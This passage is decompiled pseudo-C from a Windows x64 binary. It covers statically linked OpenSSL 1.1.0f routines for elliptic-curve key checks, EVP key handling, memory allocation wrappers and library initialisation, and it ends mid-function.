//----- (000000014001CBD0) ----------------------------------------------------
_BOOL8 __fastcall sub_14001CBD0(__int64 a1)
{
  int v1; // eax
  int v3; // [rsp+30h] [rbp+8h] BYREF

  return (int)sub_140025D60((_DWORD *)(a1 + 56), v1 - 39, &v3) > 0 && v3 > 1;
}
// 14001CBEA: variable 'v1' is possibly undefined

//----- (000000014001CC10) ----------------------------------------------------
__int64 __fastcall sub_14001CC10(__int64 *a1)
{
  unsigned int v1; // ebp
  _QWORD *v3; // rdi
  _QWORD *v4; // rsi
  __int64 v5; // rcx
  _QWORD *v6; // rdx
  __int64 *v7; // r14
  __int16 v8; // r8
  __int64 v9; // rcx
  int v11; // [rsp+20h] [rbp-18h]

  v1 = 0;
  v3 = 0i64;
  v4 = 0i64;
  if ( a1 )
  {
    v5 = a1[3];
    if ( v5 )
    {
      v6 = (_QWORD *)a1[4];
      if ( v6 )
      {
        if ( (unsigned int)sub_140022480(v5, v6) )
        {
          sub_140024610(16, 258, 106, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_key.c", 283);
LABEL_27:
          sub_140027BE0((__int64)v3);
          sub_1400222C0(v4);
          return v1;
        }
        v3 = sub_140027CD0();
        if ( !v3 )
          goto LABEL_27;
        v4 = sub_140022670((__int64 *)a1[3]);
        if ( !v4 )
          goto LABEL_27;
        if ( (int)sub_140022500(a1[3], (_QWORD *)a1[4]) <= 0 )
        {
          sub_140024610(16, 258, 107, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_key.c", 294);
          goto LABEL_27;
        }
        v7 = *(__int64 **)(a1[3] + 16);
        if ( sub_140027160((__int64)v7) )
        {
          v11 = 300;
          v8 = 122;
LABEL_20:
          sub_140024610(16, 258, v8, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_key.c", v11);
          goto LABEL_27;
        }
        if ( !(unsigned int)sub_140022600(
                              (__FrameHandler3::TryBlockMap *)a1[3],
                              v4,
                              0i64,
                              a1[4],
                              (__int64)v7,
                              (__int64)v3) )
        {
          sub_140024610(16, 258, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_key.c", 304);
          goto LABEL_27;
        }
        if ( !(unsigned int)sub_140022480(a1[3], v4) )
        {
          v11 = 308;
LABEL_19:
          v8 = 130;
          goto LABEL_20;
        }
        v9 = a1[5];
        if ( v9 )
        {
          if ( (int)sub_140026AB0(v9, v7) >= 0 )
          {
            v11 = 317;
            goto LABEL_19;
          }
          if ( !(unsigned int)sub_140022600((__FrameHandler3::TryBlockMap *)a1[3], v4, a1[5], 0i64, 0i64, (__int64)v3) )
          {
            sub_140024610(16, 258, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_key.c", 322);
            goto LABEL_27;
          }
          if ( (unsigned int)sub_1400220E0(a1[3], v4, (_QWORD *)a1[4]) )
          {
            sub_140024610(16, 258, 123, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_key.c", 326);
            goto LABEL_27;
          }
        }
        v1 = 1;
        goto LABEL_27;
      }
    }
  }
  sub_140024610(16, 258, 67, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_key.c", 278);
  return 0i64;
}

//----- (000000014001CE80) ----------------------------------------------------
__int64 __fastcall sub_14001CE80(__int64 a1)
{
  unsigned int v1; // ebp
  _DWORD *v2; // rbx
  _QWORD *v4; // rsi
  _QWORD *v5; // r15
  __int64 jumpbuf_sp; // r14

  v1 = 0;
  v2 = 0i64;
  v4 = 0i64;
  v5 = sub_140027CD0();
  if ( v5 )
  {
    v2 = *(_DWORD **)(a1 + 40);
    if ( v2 || (v2 = sub_140027200()) != 0i64 )
    {
      jumpbuf_sp = _except_get_jumpbuf_sp(*(_QWORD *)(a1 + 24));
      if ( jumpbuf_sp )
      {
        while ( (unsigned int)sub_140028310((__int64)v2, jumpbuf_sp) )
        {
          if ( !sub_140027160((__int64)v2) )
          {
            v4 = *(_QWORD **)(a1 + 32);
            if ( v4 || (v4 = sub_140022670(*(__int64 **)(a1 + 24))) != 0i64 )
            {
              if ( (unsigned int)sub_140022600(
                                   *(__FrameHandler3::TryBlockMap **)(a1 + 24),
                                   v4,
                                   (__int64)v2,
                                   0i64,
                                   0i64,
                                   (__int64)v5) )
              {
                *(_QWORD *)(a1 + 40) = v2;
                v1 = 1;
                *(_QWORD *)(a1 + 32) = v4;
              }
            }
            break;
          }
        }
      }
    }
  }
  if ( !*(_QWORD *)(a1 + 32) )
    sub_1400222C0(v4);
  if ( *(_DWORD **)(a1 + 40) != v2 )
    sub_140026FF0(v2);
  sub_140027BE0((__int64)v5);
  return v1;
}
// 1400206D0: using guessed type __int64 __fastcall _except_get_jumpbuf_sp(_QWORD);

//----- (000000014001CF90) ----------------------------------------------------
__int64 __fastcall sub_14001CF90(__int64 a1)
{
  return sub_140022600(
           *(__FrameHandler3::TryBlockMap **)(a1 + 24),
           *(_QWORD **)(a1 + 32),
           *(_QWORD *)(a1 + 40),
           0i64,
           0i64,
           0i64);
}

//----- (000000014001CFD0) ----------------------------------------------------
__int64 __fastcall sub_14001CFD0(__int64 a1, _BYTE *a2, int a3)
{
  __int64 v6; // r8
  __int64 v8; // rax

  if ( !*(_QWORD *)(a1 + 40) )
    *(_QWORD *)(a1 + 40) = sub_1400273B0();
  v6 = *(_QWORD *)(a1 + 40);
  if ( v6 )
  {
    v8 = sub_140026840(a2, a3, v6);
    *(_QWORD *)(a1 + 40) = v8;
    if ( v8 )
    {
      return 1i64;
    }
    else
    {
      sub_140024610(16, 259, 3, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_key.c", 606);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(16, 259, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_key.c", 601);
    return 0i64;
  }
}

//----- (000000014001D0A0) ----------------------------------------------------
__int64 __fastcall sub_14001D0A0(__int64 a1, _BYTE *a2, unsigned __int64 a3)
{
  int v6; // eax
  __int64 v7; // rcx
  int v8; // eax
  __int64 v9; // rdi

  v6 = sub_140021D20(*(_QWORD *)(a1 + 24));
  v7 = *(_QWORD *)(a1 + 40);
  v8 = (v6 + 7) / 8;
  v9 = v8;
  if ( !v7 )
    return 0i64;
  if ( a2 )
  {
    if ( a3 < v8 )
      return 0i64;
    if ( (unsigned int)sub_1400269E0(v7, a2, v8) == -1 )
    {
      sub_140024610(16, 260, 100, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_key.c", 578);
      return 0i64;
    }
  }
  return v9;
}

//----- (000000014001D140) ----------------------------------------------------
__int64 __fastcall sub_14001D140(__int64 a1)
{
  if ( !*(_QWORD *)(**(_QWORD **)(a1 + 24) + 336i64) )
    sub_1400234A0(
      "assertion failed: eckey->group->meth->keygen != NULL",
      "..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_key.c",
      194i64);
  return (*(__int64 (__fastcall **)(__int64))(**(_QWORD **)(a1 + 24) + 336i64))(a1);
}

//----- (000000014001D1A0) ----------------------------------------------------
_BOOL8 __fastcall sub_14001D1A0(__int64 a1, int a2, __int64 a3)
{
  if ( !a1 || !(unsigned int)sub_14001D7D0(a1, a2, 0i64, -1) )
    return 0i64;
  *(_QWORD *)(a1 + 32) = a3;
  return a3 != 0;
}

//----- (000000014001D200) ----------------------------------------------------
__int64 __fastcall sub_14001D200(__int64 a1)
{
  __int64 v1; // rax
  __int64 (*v2)(void); // rdx

  if ( a1 && (v1 = *(_QWORD *)(a1 + 16)) != 0 && (v2 = *(__int64 (**)(void))(v1 + 96)) != 0i64 )
    return v2();
  else
    return 0i64;
}

//----- (000000014001D240) ----------------------------------------------------
__int64 __fastcall sub_14001D240(__int64 a1, _DWORD *a2)
{
  __int64 v3; // rax
  __int64 (*v4)(void); // r8

  if ( *(_DWORD *)a1 != *a2 )
    return 0xFFFFFFFFi64;
  v3 = *(_QWORD *)(a1 + 16);
  if ( v3 && (v4 = *(__int64 (**)(void))(v3 + 144)) != 0i64 )
    return v4();
  else
    return 4294967294i64;
}

//----- (000000014001D290) ----------------------------------------------------
__int64 __fastcall sub_14001D290(__int64 a1, __int64 a2)
{
  __int64 v4; // rax
  unsigned int (__fastcall *v5)(__int64); // rdx
  __int16 v6; // r8
  __int64 v7; // rax
  unsigned int (__fastcall *v8)(__int64); // rdx
  __int64 v9; // rax
  __int64 (__fastcall *v10)(__int64, __int64); // r8
  __int64 result; // rax
  __int64 v12; // rax
  __int64 (__fastcall *v13)(__int64, __int64); // r8
  int v14; // [rsp+20h] [rbp-18h]

  if ( *(_DWORD *)a1 )
  {
    if ( *(_DWORD *)a1 != *(_DWORD *)a2 )
    {
      v14 = 79;
      v6 = 101;
LABEL_20:
      sub_140024610(6, 103, v6, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\p_lib.c", v14);
      return 0i64;
    }
  }
  else if ( !(unsigned int)sub_14001D7D0(a1, *(_DWORD *)a2, 0i64, -1) )
  {
    return 0i64;
  }
  v4 = *(_QWORD *)(a2 + 16);
  if ( v4 )
  {
    v5 = *(unsigned int (__fastcall **)(__int64))(v4 + 128);
    if ( v5 )
    {
      if ( v5(a2) )
      {
        sub_140024610(6, 103, 103, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\p_lib.c", 84);
        return 0i64;
      }
    }
  }
  v7 = *(_QWORD *)(a1 + 16);
  if ( v7 )
  {
    v8 = *(unsigned int (__fastcall **)(__int64))(v7 + 128);
    if ( v8 )
    {
      if ( v8(a1) )
      {
        v9 = *(_QWORD *)(a2 + 16);
        if ( v9 )
        {
          v10 = *(__int64 (__fastcall **)(__int64, __int64))(v9 + 136);
          if ( v10 )
            return v10(a1, a2);
        }
        return 0i64;
      }
    }
  }
  if ( *(_DWORD *)a1 != *(_DWORD *)a2
    || (v12 = *(_QWORD *)(a1 + 16)) == 0
    || (v13 = *(__int64 (__fastcall **)(__int64, __int64))(v12 + 144)) == 0i64
    || (result = v13(a1, a2), (_DWORD)result != 1) )
  {
    v14 = 91;
    v6 = 153;
    goto LABEL_20;
  }
  return result;
}

//----- (000000014001D3C0) ----------------------------------------------------
void __fastcall sub_14001D3C0(__int64 a1)
{
  __int64 v2; // rax
  void (__fastcall *v3)(__int64); // rdx
  _DWORD *v4; // rcx
  int v5; // [rsp+30h] [rbp+8h] BYREF

  if ( a1 )
  {
    sub_140025D60((_DWORD *)(a1 + 8), -1, &v5);
    if ( v5 <= 0 )
    {
      v2 = *(_QWORD *)(a1 + 16);
      if ( v2 )
      {
        v3 = *(void (__fastcall **)(__int64))(v2 + 168);
        if ( v3 )
        {
          v3(a1);
          *(_QWORD *)(a1 + 32) = 0i64;
        }
      }
      sub_140025890(*(_QWORD *)(a1 + 24));
      v4 = *(_DWORD **)(a1 + 56);
      *(_QWORD *)(a1 + 24) = 0i64;
      sub_140025BE0(v4);
      sub_140029720(*(void **)(a1 + 48), (void (*)(void))sub_14002DE60);
      sub_14001D930((void *)a1);
    }
  }
}
// 140025890: using guessed type __int64 __fastcall sub_140025890(_QWORD);

//----- (000000014001D460) ----------------------------------------------------
__int64 __fastcall sub_14001D460(__int64 a1)
{
  int v1; // eax

  if ( *(_DWORD *)a1 == 408 )
    return *(_QWORD *)(a1 + 32);
  sub_140024610(v1 - 50, v1 + 75, v1 + 86, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\p_lib.c", 319);
  return 0i64;
}
// 14001D48B: variable 'v1' is possibly undefined

//----- (000000014001D4B0) ----------------------------------------------------
__int64 __fastcall sub_14001D4B0(__int64 a1, __int64 a2)
{
  __int64 v2; // rax
  __int64 (__fastcall *v3)(__int64, __int64, _QWORD, __int64); // r10

  v2 = *(_QWORD *)(a1 + 16);
  if ( v2 && (v3 = *(__int64 (__fastcall **)(__int64, __int64, _QWORD, __int64))(v2 + 176)) != 0i64 )
    return v3(a1, 3i64, 0i64, a2);
  else
    return 4294967294i64;
}

//----- (000000014001D4F0) ----------------------------------------------------
__int64 __fastcall sub_14001D4F0(unsigned int *a1)
{
  return *a1;
}

//----- (000000014001D500) ----------------------------------------------------
__int64 __fastcall sub_14001D500(__int64 a1)
{
  __int64 v1; // rax
  __int64 (*v2)(void); // rdx

  v1 = *(_QWORD *)(a1 + 16);
  if ( v1 && (v2 = *(__int64 (**)(void))(v1 + 128)) != 0i64 )
    return v2();
  else
    return 0i64;
}

//----- (000000014001D530) ----------------------------------------------------
_DWORD *__fastcall sub_14001D530()
{
  int v0; // eax
  _DWORD *v1; // rbx
  _DWORD *v3; // rax

  v1 = sub_14001DC20((unsigned int)(v0 + 16));
  if ( v1 )
  {
    v1[2] = 1;
    *(_QWORD *)v1 = 0i64;
    v1[10] = 1;
    v3 = sub_140025C10();
    *((_QWORD *)v1 + 7) = v3;
    if ( v3 )
    {
      return v1;
    }
    else
    {
      sub_140024610(6, 106, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\evp\\p_lib.c", 152);
      sub_14001D930(v1);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(6, 106, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\evp\\p_lib.c", 143);
    return 0i64;
  }
}
// 14001D54A: variable 'v0' is possibly undefined
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (000000014001D5F0) ----------------------------------------------------
__int64 __fastcall sub_14001D5F0(__int64 a1, __int64 a2, int a3)
{
  __int64 v3; // rax
  __int64 (*v6)(void); // rax
  char *v8; // rax

  v3 = *(_QWORD *)(a2 + 16);
  if ( v3 )
  {
    v6 = *(__int64 (**)(void))(v3 + 56);
    if ( v6 )
      return v6();
  }
  sub_140029E80(a1, a3, 128);
  v8 = sub_14002C030(*(_DWORD *)a2);
  sub_14002A590(a1, "%s algorithm \"%s\" unsupported\n", "Public Key", v8);
  return 1i64;
}

//----- (000000014001D670) ----------------------------------------------------
_BOOL8 __fastcall sub_14001D670(__int64 a1, __int64 a2)
{
  BOOL v4; // ebx

  if ( a1 && (unsigned int)sub_14001D7D0(a1, 408, 0i64, -1) )
  {
    *(_QWORD *)(a1 + 32) = a2;
    v4 = a2 != 0;
    if ( a2 )
    {
      sub_14001CBD0(a2);
      return a2 != 0;
    }
  }
  else
  {
    return 0;
  }
  return v4;
}

//----- (000000014001D6E0) ----------------------------------------------------
__int64 __fastcall sub_14001D6E0(__int64 a1, int a2)
{
  return sub_14001D7D0(a1, a2, 0i64, -1);
}

//----- (000000014001D700) ----------------------------------------------------
__int64 __fastcall sub_14001D700(__int64 a1)
{
  __int64 v1; // rax
  __int64 (*v2)(void); // rdx

  if ( a1 && (v1 = *(_QWORD *)(a1 + 16)) != 0 && (v2 = *(__int64 (**)(void))(v1 + 88)) != 0i64 )
    return v2();
  else
    return 0i64;
}

//----- (000000014001D740) ----------------------------------------------------
__int64 __fastcall sub_14001D740(int a1)
{
  unsigned int *v1; // rax
  unsigned int v2; // ebx
  __int64 v4; // [rsp+38h] [rbp+10h] BYREF

  v1 = (unsigned int *)sub_14002CC10(&v4, a1);
  if ( v1 )
  {
    v2 = *v1;
    sub_140025890(v4);
    return v2;
  }
  else
  {
    sub_140025890(v4);
    return 0i64;
  }
}

//----- (000000014001D790) ----------------------------------------------------
_BOOL8 __fastcall sub_14001D790(__int64 a1)
{
  int v1; // eax
  int v3; // [rsp+30h] [rbp+8h] BYREF

  return (int)sub_140025D60((_DWORD *)(a1 + 8), v1 - 39, &v3) > 0 && v3 > 1;
}
// 14001D7AA: variable 'v1' is possibly undefined

//----- (000000014001D7D0) ----------------------------------------------------
__int64 __fastcall sub_14001D7D0(__int64 a1, int a2, const char *a3, int a4)
{
  __int64 v8; // rax
  void (*v9)(void); // rdx
  __int64 v10; // rax
  _DWORD *v11; // rdi
  __int64 v13; // [rsp+50h] [rbp+8h] BYREF

  v13 = 0i64;
  if ( a1 )
  {
    if ( *(_QWORD *)(a1 + 32) )
    {
      v8 = *(_QWORD *)(a1 + 16);
      if ( v8 )
      {
        v9 = *(void (**)(void))(v8 + 168);
        if ( v9 )
        {
          v9();
          *(_QWORD *)(a1 + 32) = 0i64;
        }
      }
      sub_140025890(*(_QWORD *)(a1 + 24));
      *(_QWORD *)(a1 + 24) = 0i64;
    }
    if ( a2 == *(_DWORD *)(a1 + 4) && *(_QWORD *)(a1 + 16) )
      return 1i64;
    sub_140025890(*(_QWORD *)(a1 + 24));
    *(_QWORD *)(a1 + 24) = 0i64;
  }
  if ( a3 )
    v10 = sub_14002CD10(&v13, a3, a4);
  else
    v10 = sub_14002CC10(&v13, a2);
  v11 = (_DWORD *)v10;
  if ( !a1 )
    sub_140025890(v13);
  if ( !v11 )
  {
    sub_140024610(6, 158, 156, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\evp\\p_lib.c", 204);
    return 0i64;
  }
  if ( a1 )
  {
    *(_QWORD *)(a1 + 24) = v13;
    *(_QWORD *)(a1 + 16) = v11;
    *(_DWORD *)a1 = *v11;
    *(_DWORD *)(a1 + 4) = a2;
  }
  return 1i64;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140025890: using guessed type __int64 __fastcall sub_140025890(_QWORD);

//----- (000000014001D8E0) ----------------------------------------------------
void *__fastcall sub_14001D8E0(size_t a1)
{
  if ( off_140134A40 && off_140134A40 != sub_14001D8E0 )
    return (void *)off_140134A40();
  if ( !a1 )
    return 0i64;
  dword_140134A38 = 0;
  return j__malloc_base(a1);
}
// 140134A38: using guessed type int dword_140134A38;
// 140134A40: using guessed type __int64 (*off_140134A40)(void);

//----- (000000014001D930) ----------------------------------------------------
void __fastcall sub_14001D930(void *a1)
{
  if ( !off_140134A50 || off_140134A50 == sub_14001D930 )
    j__free_base(a1);
  else
    off_140134A50();
}
// 140134A50: using guessed type __int64 (*off_140134A50)(void);

//----- (000000014001D970) ----------------------------------------------------
void *__fastcall sub_14001D970(void *a1, size_t a2, __int64 a3, unsigned int a4)
{
  void *result; // rax

  if ( off_140134A48 && (char *)off_140134A48 != (char *)sub_14001D970 )
    return (void *)off_140134A48(a1, a2);
  if ( a1 )
  {
    if ( a2 )
    {
      dword_140134A38 = 0;
      return j__realloc_base(a1, a2);
    }
    else if ( !off_140134A50 || (char *)off_140134A50 == (char *)sub_14001D930 )
    {
      j__free_base(a1);
      return 0i64;
    }
    else
    {
      off_140134A50(a1, a3, a4);
      return 0i64;
    }
  }
  else if ( !off_140134A40 || (char *)off_140134A40 == (char *)sub_14001D8E0 )
  {
    result = 0i64;
    if ( a2 )
    {
      dword_140134A38 = 0;
      return j__malloc_base(a2);
    }
  }
  else
  {
    return (void *)off_140134A40(a2);
  }
  return result;
}
// 140134A48: invalid function type '?' has been ignored
// 140134A38: using guessed type int dword_140134A38;
// 140134A40: using guessed type __int64 (__fastcall *off_140134A40)(_QWORD);
// 140134A48: using guessed type __int64 (__fastcall *off_140134A48)(_QWORD, _QWORD);
// 140134A50: using guessed type __int64 (__fastcall *off_140134A50)(_QWORD, _QWORD, _QWORD);

//----- (000000014001DA40) ----------------------------------------------------
void __fastcall sub_14001DA40(void *a1, __int64 a2, __int64 a3, unsigned int a4)
{
  if ( a1 )
  {
    if ( a2 )
      sub_140023440((__int64)a1, a2);
    if ( !off_140134A50 || (char *)off_140134A50 == (char *)sub_14001D930 )
      j__free_base(a1);
    else
      off_140134A50(a1, a3, a4);
  }
}
// 140134A50: using guessed type __int64 (__fastcall *off_140134A50)(_QWORD, _QWORD, _QWORD);

//----- (000000014001DAC0) ----------------------------------------------------
void *__fastcall sub_14001DAC0(void *a1, size_t a2, size_t a3, __int64 a4, unsigned int a5)
{
  __int64 v9; // rcx
  void *v10; // rax
  void *v11; // rbp

  if ( a1 )
  {
    if ( a3 )
    {
      if ( a3 >= a2 )
      {
        v10 = sub_14001D8E0(a3);
        v11 = v10;
        if ( v10 )
        {
          memmove(v10, a1, a2);
          sub_14001DA40(a1, a2, a4, a5);
        }
        return v11;
      }
      else
      {
        sub_140023440((__int64)a1 + a3, a2 - a3);
        return a1;
      }
    }
    else
    {
      sub_14001DA40(a1, a2, a4, a5);
      return 0i64;
    }
  }
  else if ( !off_140134A40 || (char *)off_140134A40 == (char *)sub_14001D8E0 )
  {
    v9 = 0i64;
    if ( a3 )
    {
      dword_140134A38 = 0;
      return j__malloc_base(a3);
    }
    return (void *)v9;
  }
  else
  {
    return (void *)off_140134A40(a3);
  }
}
// 140134A38: using guessed type int dword_140134A38;
// 140134A40: using guessed type __int64 (__fastcall *off_140134A40)(_QWORD);

//----- (000000014001DBF0) ----------------------------------------------------
__int64 (__fastcall *__fastcall sub_14001DBF0(_QWORD *a1, __int64 (__fastcall **a2)(), _QWORD *a3))()
{
  __int64 (__fastcall *result)(); // rax

  if ( a1 )
  {
    result = off_140134A40;
    *a1 = off_140134A40;
  }
  if ( a2 )
  {
    result = off_140134A48[0];
    *a2 = off_140134A48[0];
  }
  if ( a3 )
  {
    result = off_140134A50;
    *a3 = off_140134A50;
  }
  return result;
}
// 140134A40: using guessed type __int64 (*off_140134A40)(void);
// 140134A48: using guessed type __int64 (__fastcall *off_140134A48[2])();
// 140134A50: using guessed type __int64 (*off_140134A50)(void);

//----- (000000014001DC20) ----------------------------------------------------
void *__fastcall sub_14001DC20(size_t a1)
{
  void *v2; // rax
  void *v4; // rbx

  if ( !off_140134A40 || (char *)off_140134A40 == (char *)sub_14001D8E0 )
  {
    if ( !a1 )
      return 0i64;
    dword_140134A38 = 0;
    v2 = j__malloc_base(a1);
  }
  else
  {
    v2 = (void *)off_140134A40(a1);
  }
  v4 = v2;
  if ( v2 )
    memset(v2, 0, a1);
  return v4;
}
// 140134A38: using guessed type int dword_140134A38;
// 140134A40: using guessed type __int64 (__fastcall *off_140134A40)(_QWORD);

//----- (000000014001DCA0) ----------------------------------------------------
_QWORD *__fastcall sub_14001DCA0(__int64 *a1, __int64 a2, _QWORD *a3, int *a4)
{
  int v8; // eax
  __int64 v9; // rbp
  _BYTE *v11; // rax
  _BYTE *v12; // rbx
  _QWORD *v13; // rdi

  v8 = (int)(sub_140027260(a2) + 7) / 8;
  v9 = v8;
  if ( !v8 )
    return 0i64;
  v11 = sub_14001D8E0(v8);
  v12 = v11;
  if ( !v11 )
    return 0i64;
  if ( !(unsigned int)sub_1400269C0(a2, v11) )
  {
LABEL_12:
    sub_14001D930(v12);
    return 0i64;
  }
  if ( a3 )
  {
    v13 = a3;
  }
  else
  {
    v13 = sub_140022670(a1);
    if ( !v13 )
      goto LABEL_12;
  }
  if ( !(unsigned int)sub_140028D30(a1, v13, v12, v9, a4) )
  {
    if ( v13 != a3 )
      sub_140022090(v13);
    goto LABEL_12;
  }
  sub_14001D930(v12);
  return v13;
}

//----- (000000014001DDB0) ----------------------------------------------------
_QWORD *__fastcall sub_14001DDB0(__int64 *a1, _BYTE *a2, _QWORD *a3, int *a4)
{
  _QWORD *v8; // rbx
  __int64 *v9; // [rsp+20h] [rbp-18h] BYREF

  v9 = 0i64;
  if ( !(unsigned int)sub_140023120((__int64 *)&v9, a2) )
    return 0i64;
  v8 = sub_14001DCA0(a1, (__int64)v9, a3, a4);
  sub_140026A10(v9);
  return v8;
}

//----- (000000014001DE30) ----------------------------------------------------
__int64 __fastcall sub_14001DE30(__int64 a1, _QWORD *a2, int a3, __int64 a4, int *a5)
{
  __int64 result; // rax
  __int64 v7; // rbx
  _BYTE *v8; // [rsp+30h] [rbp-18h] BYREF

  result = sub_140028DE0(a1, a2, a3, &v8, a5);
  if ( result )
  {
    v7 = sub_140026840(v8, result, a4);
    sub_14001D930(v8);
    return v7;
  }
  return result;
}

//----- (000000014001DEA0) ----------------------------------------------------
__int64 __fastcall sub_14001DEA0(__int64 a1, _QWORD *a2, int a3, int *a4)
{
  __int64 result; // rax
  __int64 v5; // rbx
  _BYTE *v6; // rax
  _BYTE *v7; // rdi
  unsigned __int8 *v8; // r8
  char *v9; // r9
  unsigned int v10; // edx
  unsigned __int8 *v11; // [rsp+30h] [rbp-18h] BYREF

  v11 = 0i64;
  result = sub_140028DE0(a1, a2, a3, &v11, a4);
  v5 = result;
  if ( result )
  {
    v6 = sub_14001D8E0(2 * result + 2);
    v7 = v6;
    if ( v6 )
    {
      v8 = v11;
      if ( v5 )
      {
        v9 = off_140134A58;
        do
        {
          v10 = *v8++;
          *v6 = v9[(unsigned __int64)v10 >> 4];
          v6[1] = v9[v10 & 0xF];
          v6 += 2;
          --v5;
        }
        while ( v5 );
      }
      *v6 = 0;
      sub_14001D930(v11);
      return (__int64)v7;
    }
    else
    {
      sub_14001D930(v11);
      return 0i64;
    }
  }
  return result;
}
// 140134A58: using guessed type char *off_140134A58;

//----- (000000014001DF90) ----------------------------------------------------
void __fastcall sub_14001DF90()
{
  _DWORD *v0; // rbx
  __int64 v1; // rbx
  void *v2; // rcx

  if ( dword_140140890 && !dword_140140878 )
  {
    dword_140140878 = 1;
    v0 = (_DWORD *)sub_140025B80((unsigned int *)&unk_140140910);
    sub_140025CC0((unsigned int *)&unk_140140910, 0i64);
    if ( v0 )
    {
      if ( *v0 )
        sub_14002F610();
      if ( v0[1] )
        sub_140024B00();
      sub_14001D930(v0);
    }
    v1 = qword_140140880;
    while ( v1 )
    {
      (*(void (**)(void))v1)();
      v2 = (void *)v1;
      v1 = *(_QWORD *)(v1 + 8);
      sub_14001D930(v2);
    }
    qword_140140880 = 0i64;
    sub_140025BE0((_DWORD *)qword_140140888);
    if ( dword_1401408D0 )
      sub_14002F690();
    if ( dword_14014089C )
      sub_140024B70();
    sub_140025B60(&unk_140140910);
    sub_1400256B0();
    sub_14002EFF0();
    sub_140034DB0();
    sub_140026630();
    sub_14002A540();
    sub_14001E9D0();
    sub_14002CB90();
    sub_140024AC0();
    dword_140140890 = 0;
  }
}
// 140003C30: using guessed type __int64 __fastcall guard_check_icall_nop();
// 140140878: using guessed type int dword_140140878;
// 140140880: using guessed type __int64 qword_140140880;
// 140140888: using guessed type __int64 qword_140140888;
// 140140890: using guessed type int dword_140140890;
// 14014089C: using guessed type int dword_14014089C;
// 1401408D0: using guessed type int dword_1401408D0;
// 140140904: using guessed type int dword_140140904;

//----- (000000014001E0C0) ----------------------------------------------------
_BOOL8 __fastcall sub_14001E0C0(int a1, __int64 *a2)
{
  int v2; // eax
  int v6; // esi
  int v7; // eax
  int v8; // ecx
  int v9; // eax
  int v10; // ecx
  int v11; // eax
  int v12; // ecx
  int v13; // eax
  int v14; // ecx
  int v15; // eax
  int v16; // ecx
  int v17; // eax
  int v18; // ecx
  int v19; // eax
  int v20; // ecx
  int v21; // eax
  int v22; // ecx
  int v23; // ebx
  int v24; // eax
  int v25; // ecx
  int v26; // eax
  int v27; // ecx
  int v28; // eax
  int v29; // ecx
  int v30; // eax
  int v31; // ecx
  int v32; // eax
  int v33; // ecx
  int v34; // eax
  int v35; // ecx

  if ( dword_140140878 )
  {
    if ( !dword_14014090C )
    {
      dword_14014090C = 1;
      sub_140024610(v2 - 33, v2 + 68, v2 + 22, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\init.c", 510);
    }
    return 0i64;
  }
  else
  {
    v6 = 0;
    if ( !dword_140140890 )
    {
      v7 = sub_140025C90(&dword_14014087C, (void (*)(void))sub_14001E570);
      v8 = 0;
      if ( v7 )
        v8 = dword_140140894;
      if ( !v8 )
        return 0i64;
    }
    if ( (a1 & 1) != 0 )
    {
      v9 = sub_140025C90(&dword_140140898, sub_14001E730);
      v10 = 0;
      if ( v9 )
        v10 = dword_1401408A0;
      if ( !v10 )
        return 0i64;
    }
    if ( (a1 & 2) != 0 )
    {
      v11 = sub_140025C90(&dword_140140898, (void (*)(void))sub_14001E6C0);
      v12 = 0;
      if ( v11 )
        v12 = dword_1401408A4;
      if ( !v12 )
        return 0i64;
    }
    if ( (a1 & 0x10) != 0 )
    {
      v13 = sub_140025C90(&dword_1401408A8, sub_14001E6F0);
      v14 = 0;
      if ( v13 )
        v14 = dword_1401408B8;
      if ( !v14 )
        return 0i64;
    }
    if ( (a1 & 4) != 0 )
    {
      v15 = sub_140025C90(&dword_1401408A8, (void (*)(void))sub_14001E450);
      v16 = 0;
      if ( v15 )
        v16 = dword_1401408AC;
      if ( !v16 )
        return 0i64;
    }
    if ( (a1 & 0x20) != 0 )
    {
      v17 = sub_140025C90(&dword_1401408B0, sub_14001E6F0);
      v18 = 0;
      if ( v17 )
        v18 = dword_1401408B8;
      if ( !v18 )
        return 0i64;
    }
    if ( (a1 & 8) != 0 )
    {
      v19 = sub_140025C90(&dword_1401408B0, (void (*)(void))sub_14001E480);
      v20 = 0;
      if ( v19 )
        v20 = dword_1401408B4;
      if ( !v20 )
        return 0i64;
    }
    if ( (a1 & 0x80u) != 0 )
    {
      v21 = sub_140025C90(&dword_1401408BC, sub_14001E700);
      v22 = 0;
      if ( v21 )
        v22 = dword_1401408C8;
      if ( !v22 )
        return 0i64;
    }
    if ( (a1 & 0x40) != 0 )
    {
      sub_140025D20((_DWORD *)qword_140140888);
      if ( a2 )
        qword_140140918 = *a2;
      else
        qword_140140918 = 0i64;
      v23 = 0;
      if ( (unsigned int)sub_140025C90(&dword_1401408BC, (void (*)(void))sub_14001E590) )
        v23 = dword_1401408C4;
      sub_140025CE0((_DWORD *)qword_140140888);
      if ( !v23 )
        return 0i64;
    }
    if ( (a1 & 0x100) != 0 )
    {
      v24 = sub_140025C90(&dword_1401408CC, (void (*)(void))sub_14001E4B0);
      v25 = 0;
      if ( v24 )
        v25 = dword_1401408D4;
      if ( !v25 )
        return 0i64;
    }
    if ( (a1 & 0x800) != 0 )
    {
